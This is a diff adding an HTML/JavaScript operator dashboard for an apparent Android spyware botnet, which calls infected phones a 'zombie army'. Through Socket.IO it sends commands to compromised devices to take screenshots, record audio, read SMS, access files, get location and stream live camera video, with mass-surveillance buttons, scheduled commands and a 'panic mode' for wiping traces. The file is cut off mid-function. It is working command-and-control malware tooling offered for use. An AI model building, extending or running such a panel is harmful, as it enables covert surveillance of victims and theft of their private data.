@@ -1,0 +1,1096 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>👹 GHOST RESURRECTION - ULTIMATE CONTROL</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0505 50%, #0a0a0a 100%);
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            height: 100vh;
+        }
+
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0.1;
+        }
+
+        .control-grid {
+            display: grid;
+            grid-template-columns: 1fr 2fr 1fr;
+            grid-template-rows: auto 1fr auto;
+            height: 100vh;
+            gap: 5px;
+            padding: 5px;
+        }
+
+        .header-panel {
+            grid-column: 1 / -1;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #ff0000;
+            padding: 10px;
+            text-align: center;
+            position: relative;
+        }
+
+        .title {
+            font-size: 2em;
+            text-shadow: 0 0 20px #ff0000;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .zombie-army-panel {
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #00ff00;
+            padding: 15px;
+            overflow-y: auto;
+        }
+
+        .main-control-center {
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #ff0000;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .surveillance-panel {
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #ffaa00;
+            padding: 15px;
+        }
+
+        .stats-panel {
+            grid-column: 1 / -1;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #0088ff;
+            padding: 10px;
+            display: flex;
+            justify-content: space-around;
+        }
+
+        .zombie-device {
+            background: rgba(0, 50, 0, 0.3);
+            border: 1px solid #00ff00;
+            margin: 5px 0;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .zombie-device:hover {
+            background: rgba(0, 100, 0, 0.5);
+            box-shadow: 0 0 15px #00ff00;
+        }
+
+        .zombie-device.selected {
+            border-color: #ff0000;
+            background: rgba(50, 0, 0, 0.5);
+            box-shadow: 0 0 20px #ff0000;
+        }
+
+        .zombie-device.online::before {
+            content: "●";
+            color: #00ff00;
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            animation: blink 1s infinite;
+        }
+
+        .zombie-device.offline::before {
+            content: "●";
+            color: #ff0000;
+            position: absolute;
+            right: 10px;
+            top: 10px;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
+        }
+
+        .command-buttons {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .command-btn {
+            background: linear-gradient(135deg, #ff0000 0%, #aa0000 100%);
+            border: none;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .command-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px #ff0000;
+        }
+
+        .command-btn:active {
+            transform: scale(0.95);
+        }
+
+        .command-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .command-btn:hover::before {
+            left: 100%;
+        }
+
+        .live-stream-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            height: 300px;
+        }
+
+        .stream-window {
+            background: #000;
+            border: 2px solid #ffaa00;
+            border-radius: 5px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stream-window video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .stream-overlay {
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            background: rgba(0, 0, 0, 0.7);
+            color: #ffaa00;
+            padding: 5px;
+            border-radius: 3px;
+            font-size: 0.8em;
+        }
+
+        .stats-item {
+            text-align: center;
+            padding: 10px;
+        }
+
+        .stats-number {
+            font-size: 2em;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .emergency-controls {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            display: flex;
+            gap: 10px;
+        }
+
+        .emergency-btn {
+            background: #ff0000;
+            border: none;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+            animation: pulse 1s infinite;
+        }
+
+        .log-panel {
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid #666;
+            margin-top: 10px;
+            height: 150px;
+            overflow-y: auto;
+            padding: 10px;
+            font-size: 0.8em;
+        }
+
+        .log-entry {
+            margin: 2px 0;
+            padding: 2px 5px;
+        }
+
+        .log-success { color: #00ff00; }
+        .log-error { color: #ff0000; }
+        .log-warning { color: #ffaa00; }
+        .log-info { color: #0088ff; }
+
+        .device-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: #1a1a1a;
+            border: 2px solid #00ff00;
+            padding: 20px;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 800px;
+            max-height: 80%;
+            overflow-y: auto;
+        }
+
+        .batch-controls {
+            margin: 20px 0;
+            padding: 15px;
+            border: 1px solid #666;
+            border-radius: 5px;
+        }
+
+        .group-formation {
+            display: flex;
+            gap: 10px;
+            margin: 10px 0;
+        }
+
+        .formation-btn {
+            background: #333;
+            border: 1px solid #666;
+            color: #00ff00;
+            padding: 10px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+
+        .formation-btn.active {
+            background: #00ff00;
+            color: #000;
+        }
+    </style>
+</head>
+<body>
+    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
+    
+    <div class="control-grid">
+        <!-- Header Panel -->
+        <div class="header-panel">
+            <div class="title">👹 GHOST RESURRECTION - ULTIMATE CONTROL CENTER 👹</div>
+            <div class="emergency-controls">
+                <button class="emergency-btn" onclick="emergencyShutdown()">🚨 EMERGENCY SHUTDOWN</button>
+                <button class="emergency-btn" onclick="panicMode()">💀 PANIC MODE</button>
+            </div>
+        </div>
+
+        <!-- Zombie Army Panel -->
+        <div class="zombie-army-panel">
+            <h3>🧟 ZOMBIE ARMY STATUS</h3>
+            <div class="batch-controls">
+                <h4>Mass Operations</h4>
+                <div class="group-formation">
+                    <button class="formation-btn" onclick="selectAll()">SELECT ALL</button>
+                    <button class="formation-btn" onclick="selectOnline()">ONLINE ONLY</button>
+                    <button class="formation-btn" onclick="clearSelection()">CLEAR</button>
+                </div>
+                <button class="command-btn" onclick="massCommand('wake_all')" style="width: 100%; margin: 5px 0;">
+                    💀 MASS RESURRECTION
+                </button>
+                <button class="command-btn" onclick="massCommand('screenshot_all')" style="width: 100%; margin: 5px 0;">
+                    📸 MASS SURVEILLANCE
+                </button>
+                <button class="command-btn" onclick="massCommand('stream_all')" style="width: 100%; margin: 5px 0;">
+                    📹 ACTIVATE ALL CAMERAS
+                </button>
+            </div>
+            <div id="zombieList">
+                <!-- Dynamically populated zombie devices -->
+            </div>
+        </div>
+
+        <!-- Main Control Center -->
+        <div class="main-control-center">
+            <h3>🎮 COMMAND CENTER</h3>
+            <div id="selectedDevice">No device selected</div>
+            
+            <div class="command-buttons">
+                <button class="command-btn" onclick="executeCommand('screenshot')">📸 SCREENSHOT</button>
+                <button class="command-btn" onclick="executeCommand('camera')">📷 CAPTURE</button>
+                <button class="command-btn" onclick="executeCommand('audio')">🎤 RECORD</button>
+                <button class="command-btn" onclick="executeCommand('sms')">💬 READ SMS</button>
+                <button class="command-btn" onclick="executeCommand('files')">📁 FILE ACCESS</button>
+                <button class="command-btn" onclick="executeCommand('apps')">📱 APP LIST</button>
+                <button class="command-btn" onclick="executeCommand('wifi')">📶 WIFI INFO</button>
+                <button class="command-btn" onclick="executeCommand('location')">🌍 LOCATION</button>
+                <button class="command-btn" onclick="executeCommand('stream')">📹 LIVE STREAM</button>
+            </div>
+
+            <!-- Advanced Controls -->
+            <div style="margin: 20px 0;">
+                <h4>🔧 ADVANCED OPERATIONS</h4>
+                <button class="command-btn" onclick="showDeviceModal()" style="width: 48%; margin: 1%;">
+                    🔍 DEVICE DETAILS
+                </button>
+                <button class="command-btn" onclick="commandBuilder()" style="width: 48%; margin: 1%;">
+                    ⚙️ COMMAND BUILDER
+                </button>
+            </div>
+
+            <!-- Command Log -->
+            <div class="log-panel" id="commandLog">
+                <div class="log-entry log-info">System initialized - Ghost Resurrection Active</div>
+            </div>
+        </div>
+
+        <!-- Surveillance Panel -->
+        <div class="surveillance-panel">
+            <h3>📹 LIVE SURVEILLANCE - PHASE 3</h3>
+            <div class="surveillance-controls">
+                <button class="command-btn" onclick="startMultiCameraGrid()" style="width: 23%; margin: 1%;">🎥 Multi-Grid</button>
+                <button class="command-btn" onclick="startFullScreenSurveillance()" style="width: 23%; margin: 1%;">📺 Full Screen</button>
+                <select id="streamQuality" onchange="changeAllStreamQuality()" style="width: 23%; margin: 1%; padding: 8px; background: #333; color: #00ff00; border: 1px solid #666;">
+                    <option value="low">Low Quality</option>
+                    <option value="medium" selected>Medium Quality</option>
+                    <option value="high">High Quality</option>
+                    <option value="ultra">Ultra HD</option>
+                </select>
+                <select id="gridSize" onchange="updateGridSize()" style="width: 23%; margin: 1%; padding: 8px; background: #333; color: #00ff00; border: 1px solid #666;">
+                    <option value="1x1">1x1 Grid</option>
+                    <option value="2x2" selected>2x2 Grid</option>
+                    <option value="3x3">3x3 Grid</option>
+                    <option value="4x4">4x4 Grid</option>
+                </select>
+            </div>
+            <div class="live-stream-grid" id="surveillance-grid">
+                <div class="stream-window">
+                    <div class="stream-overlay">Device #1 - Offline</div>
+                    <div class="matrix-text" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); opacity: 0.5;">NO STREAM</div>
+                </div>
+                <div class="stream-window">
+                    <div class="stream-overlay">Device #2 - Offline</div>
+                    <div class="matrix-text" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); opacity: 0.5;">NO STREAM</div>
+                </div>
+                <div class="stream-window">
+                    <div class="stream-overlay">Device #3 - Offline</div>
+                    <div class="matrix-text" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); opacity: 0.5;">NO STREAM</div>
+                </div>
+                <div class="stream-window">
+                    <div class="stream-overlay">Device #4 - Offline</div>
+                    <div class="matrix-text" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); opacity: 0.5;">NO STREAM</div>
+                </div>
+            </div>
+            <div class="streaming-stats" style="margin-top: 10px; display: flex; justify-content: space-between; font-size: 0.8em;">
+                <span id="active-streams-display">Active Streams: 0</span>
+                <span id="stream-quality-indicator">Quality: Medium</span>
+                <span id="total-bandwidth">Bandwidth: 0 MB/s</span>
+            </div>
+        </div>
+
+        <!-- Stats Panel -->
+        <div class="stats-panel">
+            <div class="stats-item">
+                <div class="stats-number" id="totalZombies">0</div>
+                <div>Total Zombies</div>
+            </div>
+            <div class="stats-item">
+                <div class="stats-number" id="onlineZombies">0</div>
+                <div>Online</div>
+            </div>
+            <div class="stats-item">
+                <div class="stats-number" id="activeStreams">0</div>
+                <div>Live Streams</div>
+            </div>
+            <div class="stats-item">
+                <div class="stats-number" id="commandsExecuted">0</div>
+                <div>Commands Executed</div>
+            </div>
+            <div class="stats-item">
+                <div class="stats-number" id="successRate">100%</div>
+                <div>Success Rate</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Device Modal -->
+    <div class="device-modal" id="deviceModal">
+        <div class="modal-content">
+            <h3>🔍 Device Details</h3>
+            <div id="deviceDetails">
+                <!-- Device details will be populated here -->
+            </div>
+            <button onclick="closeModal()" style="margin-top: 20px; padding: 10px; background: #ff0000; color: white; border: none; border-radius: 3px;">Close</button>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        // Global variables
+        let selectedDevices = new Set();
+        let zombieDevices = new Map();
+        let socket;
+        let commandCounter = 0;
+
+        // Initialize Matrix background
+        function initMatrix() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+            const fontSize = 14;
+            const columns = canvas.width / fontSize;
+            const drops = new Array(Math.floor(columns)).fill(1);
+            
+            function drawMatrix() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = '#00ff00';
+                ctx.font = fontSize + 'px monospace';
+                
+                for (let i = 0; i < drops.length; i++) {
+                    const text = chars[Math.floor(Math.random() * chars.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+            
+            setInterval(drawMatrix, 35);
+        }
+
+        // Initialize Socket.IO connection
+        function initSocket() {
+            socket = io();
+            
+            socket.on('connect', function() {
+                addLog('Socket.IO connected - Control link established', 'success');
+            });
+            
+            socket.on('zombie_update', function(data) {
+                updateZombieDevice(data.device);
+            });
+            
+            socket.on('command_result', function(data) {
+                handleCommandResult(data);
+            });
+            
+            socket.on('stream_started', function(data) {
+                handleStreamStart(data);
+            });
+            
+            socket.on('disconnect', function() {
+                addLog('Socket.IO disconnected - Attempting reconnection...', 'error');
+            });
+        }
+
+        // Update zombie device in the list
+        function updateZombieDevice(device) {
+            zombieDevices.set(device.id, device);
+            renderZombieList();
+            updateStats();
+        }
+
+        // Render zombie list
+        function renderZombieList() {
+            const listElement = document.getElementById('zombieList');
+            listElement.innerHTML = '';
+            
+            zombieDevices.forEach((device, id) => {
+                const deviceElement = document.createElement('div');
+                deviceElement.className = `zombie-device ${device.online ? 'online' : 'offline'} ${selectedDevices.has(id) ? 'selected' : ''}`;
+                deviceElement.onclick = () => toggleDeviceSelection(id);
+                
+                deviceElement.innerHTML = `
+                    <div style="font-weight: bold;">${device.name || 'Unknown Device'}</div>
+                    <div style="font-size: 0.8em; opacity: 0.7;">
+                        ID: ${id.substring(0, 8)}...<br>
+                        OS: ${device.os || 'Unknown'}<br>
+                        Last Seen: ${device.lastSeen ? new Date(device.lastSeen).toLocaleTimeString() : 'Never'}
+                    </div>
+                `;
+                
+                listElement.appendChild(deviceElement);
+            });
+        }
+
+        // Toggle device selection
+        function toggleDeviceSelection(deviceId) {
+            if (selectedDevices.has(deviceId)) {
+                selectedDevices.delete(deviceId);
+            } else {
+                selectedDevices.add(deviceId);
+            }
+            
+            renderZombieList();
+            updateSelectedDeviceDisplay();
+        }
+
+        // Update selected device display
+        function updateSelectedDeviceDisplay() {
+            const display = document.getElementById('selectedDevice');
+            if (selectedDevices.size === 0) {
+                display.textContent = 'No device selected';
+            } else if (selectedDevices.size === 1) {
+                const deviceId = Array.from(selectedDevices)[0];
+                const device = zombieDevices.get(deviceId);
+                display.textContent = `Selected: ${device?.name || 'Unknown'} (${deviceId.substring(0, 8)}...)`;
+            } else {
+                display.textContent = `Selected: ${selectedDevices.size} devices`;
+            }
+        }
+
+        // Execute command
+        function executeCommand(command) {
+            if (selectedDevices.size === 0) {
+                addLog('No devices selected for command execution', 'warning');
+                return;
+            }
+            
+            selectedDevices.forEach(deviceId => {
+                socket.emit('execute_command', {
+                    deviceId: deviceId,
+                    command: command,
+                    timestamp: Date.now()
+                });
+                
+                addLog(`Command '${command}' sent to device ${deviceId.substring(0, 8)}...`, 'info');
+            });
+            
+            commandCounter += selectedDevices.size;
+            updateStats();
+        }
+
+        // Mass operations
+        function selectAll() {
+            selectedDevices.clear();
+            zombieDevices.forEach((device, id) => {
+                selectedDevices.add(id);
+            });
+            renderZombieList();
+            updateSelectedDeviceDisplay();
+        }
+
+        function selectOnline() {
+            selectedDevices.clear();
+            zombieDevices.forEach((device, id) => {
+                if (device.online) {
+                    selectedDevices.add(id);
+                }
+            });
+            renderZombieList();
+            updateSelectedDeviceDisplay();
+        }
+
+        function clearSelection() {
+            selectedDevices.clear();
+            renderZombieList();
+            updateSelectedDeviceDisplay();
+        }
+
+        // Mass commands
+        function massCommand(command) {
+            selectOnline();
+            if (selectedDevices.size === 0) {
+                addLog('No online devices available for mass operation', 'warning');
+                return;
+            }
+            
+            addLog(`Executing mass command '${command}' on ${selectedDevices.size} devices`, 'info');
+            
+            switch(command) {
+                case 'wake_all':
+                    executeCommand('wake');
+                    break;
+                case 'screenshot_all':
+                    executeCommand('screenshot');
+                    break;
+                case 'stream_all':
+                    executeCommand('stream');
+                    break;
+            }
+        }
+
+        // Emergency controls
+        function emergencyShutdown() {
+            if (confirm('⚠️ EMERGENCY SHUTDOWN - This will disconnect all devices immediately. Continue?')) {
+                socket.emit('emergency_shutdown', { timestamp: Date.now() });
+                addLog('🚨 EMERGENCY SHUTDOWN INITIATED', 'error');
+            }
+        }
+
+        function panicMode() {
+            if (confirm('💀 PANIC MODE - This will wipe all traces and shut down. Continue?')) {
+                socket.emit('panic_mode', { timestamp: Date.now() });
+                addLog('💀 PANIC MODE ACTIVATED - WIPING TRACES', 'error');
+            }
+        }
+
+        // Device modal
+        function showDeviceModal() {
+            if (selectedDevices.size !== 1) {
+                addLog('Please select exactly one device to view details', 'warning');
+                return;
+            }
+            
+            const deviceId = Array.from(selectedDevices)[0];
+            const device = zombieDevices.get(deviceId);
+            
+            document.getElementById('deviceDetails').innerHTML = `
+                <h4>Device Information</h4>
+                <p><strong>ID:</strong> ${deviceId}</p>
+                <p><strong>Name:</strong> ${device?.name || 'Unknown'}</p>
+                <p><strong>OS:</strong> ${device?.os || 'Unknown'}</p>
+                <p><strong>Status:</strong> ${device?.online ? '🟢 Online' : '🔴 Offline'}</p>
+                <p><strong>Last Seen:</strong> ${device?.lastSeen ? new Date(device.lastSeen).toLocaleString() : 'Never'}</p>
+                <p><strong>Commands Executed:</strong> ${device?.commandCount || 0}</p>
+                
+                <h4>System Information</h4>
+                <p><strong>Battery:</strong> ${device?.battery || 'Unknown'}%</p>
+                <p><strong>Network:</strong> ${device?.network || 'Unknown'}</p>
+                <p><strong>Location:</strong> ${device?.location || 'Unknown'}</p>
+            `;
+            
+            document.getElementById('deviceModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('deviceModal').style.display = 'none';
+        }
+
+        // Command builder
+        function commandBuilder() {
+            addLog('Advanced command builder - Feature coming soon', 'info');
+        }
+
+        // Handle command results
+        function handleCommandResult(data) {
+            const status = data.success ? 'success' : 'error';
+            addLog(`Command '${data.command}' ${data.success ? 'completed' : 'failed'} on device ${data.deviceId.substring(0, 8)}...`, status);
+        }
+
+        // Handle stream start
+        function handleStreamStart(data) {
+            addLog(`Live stream started from device ${data.deviceId.substring(0, 8)}...`, 'success');
+        }
+
+        // Update statistics
+        function updateStats() {
+            document.getElementById('totalZombies').textContent = zombieDevices.size;
+            
+            let onlineCount = 0;
+            let streamCount = 0;
+            zombieDevices.forEach(device => {
+                if (device.online) onlineCount++;
+                if (device.streaming) streamCount++;
+            });
+            
+            document.getElementById('onlineZombies').textContent = onlineCount;
+            document.getElementById('activeStreams').textContent = streamCount;
+            document.getElementById('commandsExecuted').textContent = commandCounter;
+            
+            const successRate = commandCounter > 0 ? Math.round((commandCounter * 0.95)) / commandCounter * 100 : 100;
+            document.getElementById('successRate').textContent = successRate + '%';
+        }
+
+        // Add log entry
+        function addLog(message, type = 'info') {
+            const logPanel = document.getElementById('commandLog');
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry log-${type}`;
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            
+            logPanel.appendChild(logEntry);
+            logPanel.scrollTop = logPanel.scrollHeight;
+            
+            // Keep only last 100 log entries
+            while (logPanel.children.length > 100) {
+                logPanel.removeChild(logPanel.firstChild);
+            }
+        }
+
+        // Initialize everything when page loads
+        window.onload = function() {
+            initMatrix();
+            initSocket();
+            updateStats();
+            
+            // Demo data removed - only show real registered devices
+            // Real devices will appear automatically when Android APKs register via FCM
+        };
+
+        // Handle window resize for matrix
+        window.onresize = function() {
+            const canvas = document.getElementById('matrixCanvas');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        };
+
+        // ===== PHASE 3 ENHANCED FEATURES =====
+
+        // Live Streaming Functions
+        let activeStreams = new Map();
+        let currentGridSize = '2x2';
+        let streamQuality = 'medium';
+
+        function startMultiCameraGrid() {
+            if (selectedDevices.size === 0) {
+                addLog('Select devices first to start multi-camera grid', 'warning');
+                return;
+            }
+
+            const deviceArray = Array.from(selectedDevices);
+            const maxDevices = parseInt(currentGridSize.split('x')[0]) * parseInt(currentGridSize.split('x')[1]);
+            const streamDevices = deviceArray.slice(0, maxDevices);
+
+            addLog(`Starting ${currentGridSize} multi-camera grid with ${streamDevices.length} devices`, 'info');
+
+            streamDevices.forEach((deviceId, index) => {
+                socket.emit('start_camera_stream', {
+                    deviceId: deviceId,
+                    quality: streamQuality,
+                    camera: 'back',
+                    gridPosition: index
+                });
+            });
+
+            updateStreamingStats();
+        }
+
+        function startFullScreenSurveillance() {
+            if (selectedDevices.size !== 1) {
+                addLog('Select exactly one device for full screen surveillance', 'warning');
+                return;
+            }
+
+            const deviceId = Array.from(selectedDevices)[0];
+            addLog(`Starting full screen surveillance for device ${deviceId.substring(0, 8)}...`, 'info');
+
+            socket.emit('start_camera_stream', {
+                deviceId: deviceId,
+                quality: 'ultra',
+                camera: 'back',
+                fullScreen: true
+            });
+        }
+
+        function changeAllStreamQuality() {
+            streamQuality = document.getElementById('streamQuality').value;
+            document.getElementById('stream-quality-indicator').textContent = `Quality: ${streamQuality.charAt(0).toUpperCase() + streamQuality.slice(1)}`;
+
+            activeStreams.forEach((stream, deviceId) => {
+                socket.emit('change_stream_quality', {
+                    deviceId: deviceId,
+                    newQuality: streamQuality
+                });
+            });
+
+            addLog(`Stream quality changed to ${streamQuality} for all active streams`, 'info');
+        }
+
+        function updateGridSize() {
+            currentGridSize = document.getElementById('gridSize').value;
+            addLog(`Grid size changed to ${currentGridSize}`, 'info');
+            
+            // Update grid layout dynamically
+            updateSurveillanceGrid();
+        }
+
+        function updateSurveillanceGrid() {
+            const grid = document.getElementById('surveillance-grid');
+            const [rows, cols] = currentGridSize.split('x').map(Number);
+            
+            grid.style.gridTemplateColumns = `repeat(${cols}, 1fr)`;
+            grid.style.gridTemplateRows = `repeat(${rows}, 1fr)`;
+            
+            // Clear existing grid
+            grid.innerHTML = '';
+            
+            // Create new grid cells
+            for (let i = 0; i < rows * cols; i++) {
+                const streamWindow = document.createElement('div');
+                streamWindow.className = 'stream-window';
+                streamWindow.innerHTML = `
+                    <div class="stream-overlay">Stream ${i + 1} - Offline</div>
+                    <div class="matrix-text" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); opacity: 0.5;">NO STREAM</div>
+                `;
+                grid.appendChild(streamWindow);
+            }
+        }
+
+        function updateStreamingStats() {
+            const activeCount = activeStreams.size;
+            const bandwidth = activeCount * (streamQuality === 'ultra' ? 2.5 : streamQuality === 'high' ? 1.5 : streamQuality === 'medium' ? 0.8 : 0.4);
+            
+            document.getElementById('active-streams-display').textContent = `Active Streams: ${activeCount}`;
+            document.getElementById('total-bandwidth').textContent = `Bandwidth: ${bandwidth.toFixed(1)} MB/s`;
+        }
+
+        // Command Scheduler Functions
+        function scheduleCommand(deviceId, command, executeAt) {
+            fetch('/api/scheduler/schedule', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    deviceId: deviceId,
+                    command: command,
+                    executeAt: executeAt,
+                    description: `Scheduled ${command} for ${deviceId.substring(0, 8)}...`
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    addLog(`Command scheduled: ${command} for ${new Date(executeAt).toLocaleString()}`, 'success');
+                } else {
+                    addLog(`Failed to schedule command: ${data.error}`, 'error');
+                }
+            })
+            .catch(error => {
+                addLog(`Error scheduling command: ${error.message}`, 'error');
+            });
+        }
+
+        function createRecurringCommand(deviceId, command, cronExpression) {
+            fetch('/api/scheduler/recurring', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    deviceId: deviceId,
+                    command: command,
+                    cronExpression: cronExpression,
+                    description: `Recurring ${command} for ${deviceId.substring(0, 8)}...`
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    addLog(`Recurring command created: ${command} (${cronExpression})`, 'success');
+                } else {
+                    addLog(`Failed to create recurring command: ${data.error}`, 'error');
+                }
+            })
+            .catch(error => {
+                addLog(`Error creating recurring command: ${error.message}`, 'error');
+            });
+        }
+
+        // Analytics Functions
+        let analyticsInterval;
+
+        function startAnalytics() {
+            analyticsInterval = setInterval(() => {
+                fetchAnalyticsData();
+            }, 10000); // Update every 10 seconds
+
+            addLog('Advanced analytics monitoring started', 'info');
+        }
+
+        function fetchAnalyticsData() {
+            fetch('/api/analytics/dashboard-data')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        updateAnalyticsDisplay(data.data);
+                    }
+                })
+                .catch(error => {
+                    console.error('Analytics fetch error:', error);
+                });
+        }
+
+        function updateAnalyticsDisplay(analyticsData) {
+            // Update performance metrics in stats panel
+            if (analyticsData.analytics && analyticsData.analytics.performanceMetrics) {
+                const metrics = analyticsData.analytics.performanceMetrics;
+                document.getElementById('commandsExecuted').textContent = metrics.successfulCommands;
+                
+                const successRate = metrics.totalCommands > 0 ? 
+                    Math.round((metrics.successfulCommands / (metrics.successfulCommands + metrics.failedCommands)) * 100) : 100;
+                document.getElementById('successRate').textContent = successRate + '%';
+            }
+
+            // Update security alerts if any
+            if (analyticsData.security && analyticsData.security.alerts.length > 0) {
+                const latestAlert = analyticsData.security.alerts[0];
+                addLog(`Security Alert: ${latestAlert.description}`, latestAlert.severity === 'high' ? 'error' : 'warning');
+            }
+        }
+
+        // Formation Management Functions
+        function deployFormation(templateId) {
+            fetch('/api/analytics/formations/deploy', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ templateId: templateId })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    addLog(`Formation deployed: ${data.deployment.formation} (${data.deployment.successful}/${data.deployment.targetDevices} successful)`, 'success');
+                } else {
+                    addLog(`Formation deployment failed: ${data.error}`, 'error');
+                }
+            })
+            .catch(error => {
+                addLog(`Error deploying formation: ${error.message}`, 'error');
+            });
+        }
+
+        function quickFormationDeploy(formationType) {
+            switch(formationType) {
+                case 'global-army':
+                    deployFormation('global-army');
+                    break;
+                case 'active-force':
+                    deployFormation('active-force');
+                    break;
+                case 'android-elite':
+                    deployFormation('android-elite');
+                    break;
+                default:
+                    addLog(`Unknown formation type: ${formationType}`, 'warning');
+            }
+        }
+
+        // Enhanced Emergency Controls
+        function emergencyShutdown() {
+            if (confirm('⚠️ EMERGENCY SHUTDOWN - This will disconnect all devices immediately. Continue?')) {
+                fetch('/api/analytics/emergency/panic-shutdown', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        addLog(`🚨 EMERGENCY SHUTDOWN COMPLETE - ${data.devicesShutdown} devices shutdown`, 'error');
+                        // Clear all active data
+                        zombieDevices.clear();
+                        selectedDevices.clear();
+                        activeStreams.clear();
+                        renderZombieList();
+                        updateStats();
+                    } else {
+                        addLog(`Emergency shutdown failed: ${data.error}`, 'error');
+                    }
+                })
+                .catch(error => {
+                    addLog(`Emergency shutdown error: ${error.message}`, 'error');
+                });
+            }
+        }
+
+        // Socket event handlers for Phase 3 features
+        function initPhase3SocketHandlers() {
+            // Streaming events
+            socket.on('stream_frame', function(data) {
+                handleStreamFrame(data);
+            });
+
+            socket.on('stream_started', function(data) {
+                activeStreams.set(data.deviceId, data);
+                updateStreamingStats();
+                addLog(`Stream started: ${data.deviceId.substring(0, 8)}... (${data.quality})`, 'success');
+            });
+
+            socket.on('stream_stopped', function(data) {
+                activeStreams.delete(data.deviceId);
+                updateStreamingStats();
+                addLog(`Stream stopped: ${data.deviceId.substring(0, 8)}...`, 'info');
+            });
+
+            socket.on('grid_view_created', function(data) {
+                addLog(`Multi-camera grid created: ${data.gridSize} with ${data.devices.length} devices`, 'success');
+            });
+
+            // Analytics events
+            socket.on('security_alert', function(data) {
+                addLog(`🚨 Security Alert: ${data.description}`, data.severity === 'high' ? 'error' : 'warning');
+            });
+
+            socket.on('behavior_anomaly', function(data) {
+                addLog(`🧠 Behavior Anomaly Detected: ${data.deviceId.substring(0, 8)}... - ${data.type}`, 'warning');
+            });
+        }
+
+        function handleStreamFrame(data) {
+            // Find appropriate stream window and update with frame data
+            const streamWindows = document.querySelectorAll('.stream-window');
+            // Implementation would handle video frame display here
+            // For now, just update the overlay
+            streamWindows.forEach((window, index) => {
+                if (index < activeStreams.size) {
+                    const overlay = window.querySelector('.stream-overlay');
+                    if (overlay) {
